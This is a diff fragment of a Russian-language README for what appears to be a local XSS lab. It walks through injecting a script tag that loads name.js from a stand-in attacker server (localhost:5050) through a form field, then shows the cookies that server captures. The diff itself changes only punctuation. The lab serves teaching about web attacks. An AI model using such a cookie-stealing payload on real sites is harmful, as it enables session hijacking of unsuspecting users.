@@ -19,7 +19,7 @@ localhost:5050 это сервер злоумышленника.
 2) http://localhost:5005/form и вводим следующие: Имя<script src="http://localhost:5050/name.js"></script>
 3) http://localhost:5005/form и вводим что угодно, и мы увидим, что серевер злаумышлинников получил cookie
 4) http://localhost:5005/echo?message=Hello тем самым изменим cookie в нашем браузере (cookie не создаются рандомно, а одни если мы сходим на /form и другие если на echo?message=...)
-5) http://localhost:5005/get?username=NAME тем самым мы не сменим cookie и увидим список посетителей, а значит, отправим наши cookie
+5) http://localhost:5005/get?username=NAME тем самым мы не сменим cookie и увидим список посетителей, а значит, отправим наши cookie.
 Мы видим в консоли сервера злоумышленника:
 до 4) login get-successfully-cookie-secretum
 полсе 4) login get-successfully-cookie-secretum; login=ok-echo
